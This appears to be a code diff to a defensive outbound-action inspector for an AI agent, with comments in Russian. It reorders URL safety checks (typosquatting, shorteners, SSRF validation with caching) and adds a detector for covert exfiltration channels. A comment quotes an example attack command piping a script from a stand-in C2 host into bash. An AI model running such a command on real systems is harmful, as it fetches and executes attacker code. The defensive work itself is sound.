@@ -139,6 +139,7 @@ _SOL_CAND_RE = re.compile(r"\b[1-9A-HJ-NP-Za-km-z]{32,44}\b")
 _IBAN_CAND_RE = re.compile(r"\b[A-Z]{2}\d{2}[A-Z0-9]{11,30}\b")
 _CARD_CAND_RE = re.compile(r"\b(?:\d[ -]?){13,19}\b")
 _URL_RE = re.compile(r"\b(?:https?|ftp|file|javascript|data):[^\s\"'<>`]+", re.IGNORECASE)
+_VALIDATED_HOST_CACHE: dict[str, float] = {}
 _SHORTENER_HOSTS = frozenset({
     "bit.ly", "tinyurl.com", "t.co", "goo.gl", "is.gd", "cutt.ly", "rb.gy", "ow.ly", "tiny.cc",
 })
@@ -1067,21 +1068,8 @@ def inspect_outbound_action(
                 "detail": f"Запрещённая схема URL: {u[:60]}",
             })
             continue
-        try:
-            net_guard.validate_outbound_url(
-                u, allow_localhost=False, allow_http_localhost=False, require_https=False
-            )
-        except Exception as exc:
-            hard_block = True
-            risk_level = "critical"
-            reasons.append({
-                "code": "ssrf_or_unsafe_url",
-                "severity": "critical",
-                "detail": f"URL отклонён сетевым фильтром: {str(exc)[:140]}",
-            })
-            continue
-
         host = urllib.parse.urlsplit(u).netloc.lower().split(":")[0]
+        # Сначала мгновенные локальные проверки (< 0.1 мс, без сетевого DNS-таймаута!)
         if host.startswith("xn--") or ".xn--" in host:
             risk_level = "high" if risk_level != "critical" else risk_level
             reasons.append({
@@ -1096,7 +1084,8 @@ def inspect_outbound_action(
                 "severity": "high",
                 "detail": f"Обнаружен сокращатель ссылок ({host}), скрывающий конечную цель.",
             })
-        if not _domain_allowed(host, allowed_domains):
+        typo_match = None
+        if host and not _domain_allowed(host, allowed_domains):
             typo_match = next((d for d in allowed_domains if abs(len(host) - len(d)) <= 2 and 1 <= _levenshtein(host, d) <= 2), None)
             if typo_match:
                 hard_block = True
@@ -1106,18 +1095,44 @@ def inspect_outbound_action(
                     'severity': 'critical',
                     'detail': f'Подозрение на Typosquatting: {host} отличается на 1-2 символа от доверенного {typo_match}!',
                 })
-            else:
-                prof = str(_default_state(memory).get('policy_profile') or 'balanced')
-                if prof == 'paranoid_airgap':
-                    hard_block = True
-                    risk_level = 'critical'
-                elif risk_level == "low":
-                    risk_level = "medium"
+                continue
+        # Если уже сработал опасный shell (например `curl https://c2/p.sh | bash`) или секрет,
+        # НЕ выполняем сетевой DNS-запрос к C2-домену злоумышленника (защита от DNS-утечки и задержек).
+        if hard_block or _DANGEROUS_SHELL_RE.search(expanded_for_scan):
+            continue
+        # Сетевая анти-SSRF проверка (IPv4/IPv6 приватные диапазоны, metadata 169.254.169.254, localhost)
+        _now_m = time.monotonic()
+        _cache_key = f"{urllib.parse.urlsplit(u).scheme.lower()}://{host}"
+        if _VALIDATED_HOST_CACHE.get(_cache_key, 0.0) <= _now_m:
+            try:
+                net_guard.validate_outbound_url(
+                    u, allow_localhost=False, allow_http_localhost=False, require_https=False
+                )
+                if host and not re.fullmatch(r"[0-9.:\[\]]+", host):
+                    if len(_VALIDATED_HOST_CACHE) > 256:
+                        _VALIDATED_HOST_CACHE.clear()
+                    _VALIDATED_HOST_CACHE[_cache_key] = _now_m + 60.0
+            except Exception as exc:
+                hard_block = True
+                risk_level = "critical"
                 reasons.append({
-                    "code": "new_external_domain",
-                    "severity": "critical" if prof == 'paranoid_airgap' else "medium",
-                    "detail": f"Новый внешний домен ({host}) не входит в доверенный список владельца.",
+                    "code": "ssrf_or_unsafe_url",
+                    "severity": "critical",
+                    "detail": f"URL отклонён сетевым фильтром: {str(exc)[:140]}",
                 })
+                continue
+        if host and not _domain_allowed(host, allowed_domains):
+            prof = str(_default_state(memory).get('policy_profile') or 'balanced')
+            if prof == 'paranoid_airgap':
+                hard_block = True
+                risk_level = 'critical'
+            elif risk_level == "low":
+                risk_level = "medium"
+            reasons.append({
+                "code": "new_external_domain",
+                "severity": "critical" if prof == 'paranoid_airgap' else "medium",
+                "detail": f"Новый внешний домен ({host}) не входит в доверенный список владельца.",
+            })
 
     # Проверка кошельков / реквизитов и Payee-Swap
     indicators = _extract_payment_indicators(combined)
@@ -1178,6 +1193,20 @@ def inspect_outbound_action(
 
     decoded_layers = solana_crypto_shield.deobfuscate_layers(combined, max_layers=4)
     deep_blob = "\n".join(decoded_layers[:8])
+
+    # Детектор скрытых каналов эксфильтрации (Markdown Image Exfil, DNS-туннели, Stego)
+    try:
+        from .shield import exfil_guard as _exf
+        exf_res = _exf.inspect_exfil_channels(deep_blob, allowed_domains=allowed_domains)
+        for ef in (exf_res.get("findings") or []):
+            if ef["severity"] == "critical":
+                hard_block = True
+                risk_level = "critical"
+            elif risk_level in ("low", "medium"):
+                risk_level = "high"
+            reasons.append(ef)
+    except Exception:
+        pass
 
     # Декодер смарт-контрактов EVM ABI / Solana (Кольцо 3)
     try:
